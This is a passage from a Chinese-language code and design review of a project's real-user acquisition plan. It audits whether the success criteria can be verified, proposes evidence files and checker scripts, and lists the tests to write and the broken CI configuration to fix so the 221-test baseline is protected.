     `uv sync --group dev` → "Group `dev` is not defined in the project's `dependency-groups` table" → exit 2
     → 后续 10 个质量步骤全部 skipped。CI 现在等于没有。

结论：README 的 175、AGENTS 的 163、v0.75.3 commit 的 183，三个数都不等于实测的 221。

════════════════════════════════════════
一、§1 四条标准的可验证性
════════════════════════════════════════
（§1 的"验证方式"列写的是**证据类型**，不是**证据落盘位置 + 判定命令**——这是根本病根）

[§1 表格缺「证据文件路径」列，四条标准的证据全凭记忆，验收时无物可查]
  → docs/real-user-acquisition-design.md:19-24（验证方式列只有"微信记录/截图/日志时间戳"这类描述）
  → P0
  → §1 加两列：「证据文件(路径)」+「判定命令」，例如 docs/evidence/user-A/diag.zip + 一行判据脚本。没有落盘路径的标准一律不算可验证。

[P0-1「≥3 人独立完成安装→首次任务」无法客观验证，且极易被假信号蒙混]
  → docs/real-user-acquisition-design.md:21；证据源全在用户机器（exe 本地跑、不上云、无回传），项目侧零留痕
  → P0
  → 三处不可验证：①「首次任务」没有终点定义（打开窗口？出报告？）；②「独立」无判定，一边语音指导一边操作，截图看不出来；③ 截图只能证明"装了/打开了"，不能证明任务真跑完。而文档 §5-F5 自己承认礼貌性试用是假信号，却没给任何识别手段。

[P0-2「≥3 条真实问题写进 docs/user-feedback.md」可查，但证据是自证的]
  → docs/real-user-acquisition-design.md:22；文件由我本人撰写，"问题"是我的转述，无外部锚点
  → P0
  → "含场景描述、非'不好用'"是主观判据，裁判=被考核人。F5 礼貌反馈恰好逃得过这个机制。

[P1「≥1 人主动第二次使用」在现有形态下客观不可验证]
  → docs/real-user-acquisition-design.md:23（验证方式="使用日志/主动询问"）
  → P1（会让该标准实质失效）
  → "主动询问"= 用户口述，"我会再用的"正是 F5 礼貌信号；"使用日志"在用户机器上，不导出就拿不到。要救它必须把 §6 里那个 P1 的「导出诊断包」按钮**提前到 P0**，否则"留存"永远只是"他说他会用"。

[P2「口述 3 分钟不卡壳」完全不可验证——而且它是唯一能"零用户"通过的一条]
  → docs/real-user-acquisition-design.md:24
  → P0（级别应上调）
  → 无产物、无观察者、无评分标准，唯一裁判是受益者本人。更要命的是：它恰恰是唯一直接对应项目真实目的（面试必问"谁在用"）的标准——P0 两条证据薄，P2 照样"过"，绿灯就是假的。必须改成可留痕形式（见第二节-4）。

[§1 反面标准的措辞自相矛盾，验收时会被利用]
  → docs/real-user-acquisition-design.md:26 "用户装了打不开也算"
  → P2
  → 与 P0-1「完成首次任务」直接冲突，读起来像"打不开也算达标"。改成明确三态：达标 / 失败但有效记录 / 无效（礼貌试用）。

════════════════════════════════════════
二、可执行验证方法（每条给命令/记录方式）
════════════════════════════════════════
  总原则：建 docs/evidence/user-X/ 每用户一目录，一切证据落文件（时间戳不可篡改），不落盘=未验证。

  1) P0-1 验证
     - 前提改动：把「导出诊断包」从 P1 提到 P0（这是 P0-1 唯一客观证据源，不能不提前）。
     - 「完成首次任务」的客观定义写进文档：产物 = ≥1 个 report .md/.html 或 1 个完整会话 JSON，owner_id=该用户，且 install→产物 < 30 分钟。
     - 判定：收到 zip 后跑 scripts/verify_user_evidence.py <zip>，机检三条——
       a. sessions/*.json 里该用户有 ≥1 条 user+assistant 成对的完整会话；
       b. 产物 mtime 落在安装当天；
       c. audit 日志有该工具链调用记录（证明"跑通了"而非"打开了"）。
     - 「独立」的判定：用日志时间戳与你当日的聊天/通话记录交叉核对，写进 user-X/timeline.md。承认这条仍含自述成分，所以证据链以 a/b/c 为准，不靠截图。

  2) P0-2 验证
     - 每条问题必须带 4 字段，缺一不算（模板固定）：
       ① 用户原话（引用原文，raw 截图/语音转写存 docs/evidence/user-X/raw/）；
       ② 时间 + 复现步骤；③ 分类（产品缺陷/不会用/环境）；④ 处置（我改了→commit hash；不改→理由+决定）。
     - 机检"可讲性"：统计 user-feedback.md 里带 commit hash 的条目数。面试要的是"发现→修复"闭环，只有带 hash 的算数。
     - 反假信号：② 复现步骤天然筛掉礼貌反馈——说不出步骤的就是无效反馈。

  3) P1 验证
     - 把留存定义为机器可判：同一用户名的会话出现在 ≥2 个不同日期（不是同一天开两次）。
     - 判定：从导出 zip 的 sessions 里算 distinct(date(mtime)) ≥ 2。
     - 次优证据：用户未被提醒时主动发消息问功能（保留原始消息截图）。明确不接受"他说他会用"。

  4) P2 验证（改成可留痕）
     - 手机即席录 3 分钟（不写稿不排练），存 docs/evidence/interview-l1-1.mp3。
     - rubric 4 项必含，缺一=不达标：① 用户是谁（可指名的场景，不说"有几个人用了"）；② 具体场景 + 他原本怎么做；③ 具体问题原话 + 属于产品缺陷还是不会用；④ 我改了什么（对应 commit）+ 结果。
     - 找一个真人当模拟面试官听，记录他的追问 → 追问点就是卡壳点。
     - 一票否决：说不出 ③ 的原话 = 问题不是你收集的，是你编的。

════════════════════════════════════════
三、要不要写自动化测试？——要，但只测边界层
════════════════════════════════════════
  边界规则一句话：改动碰到 core/ 或 HTTP 合同面 → 必须有测试；只碰 docs/、打包脚本、前端文案 → 人工清单打勾，不进 CI。

  【必须写，进 CI】
  [内置体验 key 的限额路径零测试覆盖]
    → tests/ 里 grep budget|quota|限额 只命中 test_circuit_breaker_wiring.py（接线用例），无配额扣减/耗尽/重置语义
    → P0
    → 测：配额扣减、耗尽后拒绝并给中文提示（不是静默继续烧钱）、并发扣减、重置。限额本质是灵枢核心卖点（预算/熔断）的延伸，不测=限额是口号。

  [导出诊断包端点的鉴权与 owner_id 隔离无测试]
    → 无任何 tests/ 文件覆盖该端点（现 tests/ 无 setup/export 相关用例）
    → P0
    → 三条：无 token / 他人 token / 本人 token。越权读别人日志必须 403。这条同时是 secguard 的边界，测试层面必须有。

  [8788 端口被占时的启动行为（§5-B4）可测但未测]
    → P2
    → 子进程级测：端口占用时应给中文错误，不能白屏/静默死。

  【应该写，回归面】
  [3 个场景模板（§7-3）无 smoke 测试]
    → P1
    → 每模板 1 条：能进 graph、能出非空产物（不校验质量）。这是 C2"首次任务成功率"唯一的机器防线。
  [每修一个用户报的 bug 必须补一条复现测试（红→绿）]
    → P1
    → 这就是基线该涨的地方；也是面试"上线→发现问题→修复"闭环的硬证据。

  【明确不写（防过度工程）】
  [为上手指引/截图/微信话术写测试] → 文档不可测，别造测试 → P2 → 人工清单打勾
  [模拟干净机器安装 exe] → 成本远超收益（要 VM/装 exe）→ 保留为"人肉验证：≥1 台干净机"，标注清楚它不是测试覆盖，是 §4-U1/U2 的验证动作
  [user-feedback.md 格式的 pytest] → 用一个 grep 脚本机检即可

════════════════════════════════════════
四、221 基线怎么守住（先纠正"175"这个错数）
════════════════════════════════════════
  [README badge 175 与实测 221 不符——这正是 AGENTS 红线"数字必须对上仓库"要禁的事]
    → README.md:11（badge 175）、README.md:182（"实测 175 passed/8 failed/2 skipped"）；实测 221 passed/2 skipped/8 deselected
    → P1（对外数字失真，30 秒可被 GitHub 证伪）
    → badge 改 221，并在正文写明命令与日期。另外 38 个知识管道测试在 docs/knowledge-pipeline/，不在 testpaths、CI 根本不跑（我单独跑：38 passed）→ 要么纳入 testpaths 一起守，要么 README 明确写"项目 221 + 管道 38"，不要混成一个数。

  [CI 全红，且只挂在 install 步骤；修复代码已写但未提交]
    → gh run 34164057862 18s：`uv sync --group dev` → exit 2；git status 显示 ci.yml/pyproject.toml/pytest.ini/conftest.py 均为 M（未提交）
    → P0
    → 立即把 ci.yml + pytest.ini + pyproject.toml 同一 commit 提交。在此之前，221 这个数字没有任何自动化在保护。

  [两个配置耦合，只交一个会从"install 红"变成"test 红"]
    → 实测 `pytest -m integration` → 6 failed（全是 cs_stream 打 127.0.0.1:8788 ConnectionError）
    → P0
    → 别用 `-m "not integration"` 静默 deselect 掩盖缺陷——改成 skipif + 端口探测（或 HARNESS_INTEGRATION=1 显式开启），让"没起服务"显示为 skipped 而不是凭空消失。8 个用例永久不跑且无人知道，是欠债。

  [覆盖率 ratchet 只剩 1.79pt 余量，本次 MVP 加代码不加测试就会红]
    → 实测 36.79% vs 门槛 35%（ci.yml:59，作者自留 1.6pt 平台差）
    → P1
    → 本次改动必须带测试（见第三节必写项），否则 install 修好后 CI 会因覆盖率再红一次。

  [加"数字不许少"的机检] → P1
    → scripts/test_gate.py：跑 pytest，断言 passed >= 221 且 failed == 0，输出 docs/test-baseline.md（数字+日期+命令）。基线的"只许涨"必须机器判，不靠人看。

════════════════════════════════════════
总裁决
════════════════════════════════════════
【该改】——方向对（把"没人用"填上确实是面试最致命的空格），但当前形态过不了我的门禁：CI 全红且只挂在 install 步骤（10 个质量步骤全 skipped）、README 数字 175 与实测 221 不符、四条成功标准里 3 条实际是自证或口头。把「导出诊断包」提前到 P0 当客观证据通道、P2 改成录音+rubric、三个配置文件同 commit 提交，这个项目才算真的可交付。

测试门禁：**没过**。基线 221 passed（不是 175）当前无人守护——CI 自 2026-08-23 起连续红，最近的 09-08 docs commit 仍红。
